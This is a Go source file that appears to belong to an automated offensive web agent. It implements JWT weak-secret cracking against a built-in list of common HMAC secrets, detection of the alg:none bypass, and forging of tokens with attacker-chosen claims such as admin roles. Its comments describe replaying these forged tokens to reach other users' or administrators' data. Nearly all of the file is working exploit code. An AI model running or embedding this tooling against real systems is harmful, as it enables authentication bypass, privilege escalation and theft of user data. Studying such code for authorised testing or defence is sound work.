package webagent

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"hash"
	"strings"
)

// jwt.go gives the offensive agent a JWT weak-secret crack + forge capability. It pairs with the
// session-cookie surfacing (§ tools.go cookie_set / SESSION SET): a JWT session token now reaches the
// agent, and if that token is signed with a guessable HMAC secret — or uses the classic alg:none
// bypass — the agent can mint a token with attacker-chosen claims (user:admin) and replay it via
// send_request to reach another user's / an admin's data (IDOR / privilege-escalation / auth-bypass).
//
// This is exploitation TOOLING (the agent's hands), not a detection scanner (§13). It is GROUNDED
// (§10): a secret only "cracks" when its HMAC signature ACTUALLY verifies against the token — there is
// no guessing, so it can never produce a false positive.

// jwtWeakSecrets is a small, high-signal list of the HMAC secrets that show up in tutorials, framework
// defaults, and leaked configs — the ones a real JWT weak-secret bug almost always uses. Kept short on
// purpose; a full wordlist belongs in an OSS cracker (hashcat -m 16500), out of scope here.
var jwtWeakSecrets = []string{
	"", "secret", "Secret", "SECRET", "secretkey", "secret_key", "secretKey",
	"password", "Password", "123456", "changeme", "change-me", "admin",
	"key", "private", "jwt", "jwtsecret", "jwt_secret", "jwtSecret",
	"token", "test", "dev", "s3cr3t", "supersecret", "super-secret",
	"your-256-bit-secret", "your_secret_key", "mysecret", "mysecretkey",
	"qwerty", "root", "default", "example", "hmac", "signature",
}

// jwtResult is the outcome of a crack attempt (+ optional forge).
type jwtResult struct {
	Alg     string // the token's declared algorithm
	Header  string // decoded header JSON
	Payload string // decoded payload JSON (the claims)
	Cracked bool   // an HMAC secret verified
	Secret  string // the cracked secret (when Cracked)
	AlgNone bool   // the token uses alg:none (unsigned — forge freely)
	Forged  string // a minted token carrying the requested claims (when forgeable + claims given)
	Note    string // human-readable status when not cracked
}

func jwtDecodeSeg(seg string) ([]byte, bool) {
	b, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(seg, "="))
	if err != nil {
		return nil, false
	}
	return b, true
}

func hmacFor(alg string) func() hash.Hash {
	switch strings.ToUpper(alg) {
	case "HS256":
		return sha256.New
	case "HS384":
		return sha512.New384
	case "HS512":
		return sha512.New
	}
	return nil
}

// crackJWT parses a JWT, tries the weak-secret list against its HMAC signature (or detects alg:none),
// and — when forgeClaims is non-nil and the token is forgeable — mints a token carrying those claims.
func crackJWT(token string, forgeClaims map[string]any) jwtResult {
	var res jwtResult
	parts := strings.Split(strings.TrimSpace(token), ".")
	if len(parts) < 2 {
		res.Note = "not a JWT (expected header.payload.signature)"
		return res
	}
	hdrB, ok1 := jwtDecodeSeg(parts[0])
	payB, ok2 := jwtDecodeSeg(parts[1])
	if !ok1 || !ok2 {
		res.Note = "could not base64url-decode the JWT header/payload"
		return res
	}
	res.Header = string(hdrB)
	res.Payload = string(payB)
	var hdr struct {
		Alg string `json:"alg"`
	}
	_ = json.Unmarshal(hdrB, &hdr)
	res.Alg = hdr.Alg

	// alg:none bypass — the signature is not verified, so forge freely.
	if strings.EqualFold(hdr.Alg, "none") {
		res.AlgNone = true
		res.Note = "alg:none — signature not verified; any claims can be forged"
		if forgeClaims != nil {
			res.Forged = forgeJWT(payB, forgeClaims, "none", "")
		}
		return res
	}

	hfn := hmacFor(hdr.Alg)
	if hfn == nil {
		res.Note = "alg " + hdr.Alg + " is not HMAC (HS256/384/512); weak-secret crack N/A (RS/ES need key-confusion, out of scope)"
		return res
	}
	if len(parts) < 3 {
		res.Note = "HMAC alg but no signature segment present"
		return res
	}
	sigBytes, ok := jwtDecodeSeg(parts[2])
	if !ok {
		res.Note = "could not decode the signature segment"
		return res
	}
	signingInput := parts[0] + "." + parts[1]
	for _, s := range jwtWeakSecrets {
		mac := hmac.New(hfn, []byte(s))
		mac.Write([]byte(signingInput))
		if hmac.Equal(mac.Sum(nil), sigBytes) { // ACTUAL verification — no false positive (§10)
			res.Cracked = true
			res.Secret = s
			if forgeClaims != nil {
				res.Forged = forgeJWT(payB, forgeClaims, hdr.Alg, s)
			}
			return res
		}
	}
	res.Note = "not cracked with the built-in weak-secret list — the secret is strong (or non-HMAC); an OSS cracker (hashcat -m 16500) with a full wordlist is the next step"
	return res
}

// forgeJWT mints a new token: the original claims merged with the attacker's, signed with the found
// secret (or left unsigned for alg:none). Only reached after crackJWT proved the secret / alg:none, so
// the forged token is guaranteed to verify server-side.
func forgeJWT(origPayload []byte, claims map[string]any, alg, secret string) string {
	m := map[string]any{}
	_ = json.Unmarshal(origPayload, &m) // start from the real claims so required fields (exp, iss…) survive
	for k, v := range claims {
		m[k] = v
	}
	payB, _ := json.Marshal(m)
	hdrB, _ := json.Marshal(map[string]string{"alg": alg, "typ": "JWT"})
	seg := func(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }
	signingInput := seg(hdrB) + "." + seg(payB)
	if strings.EqualFold(alg, "none") {
		return signingInput + "." // unsigned
	}
	if hfn := hmacFor(alg); hfn != nil {
		mac := hmac.New(hfn, []byte(secret))
		mac.Write([]byte(signingInput))
		return signingInput + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	}
	return signingInput + "."
}
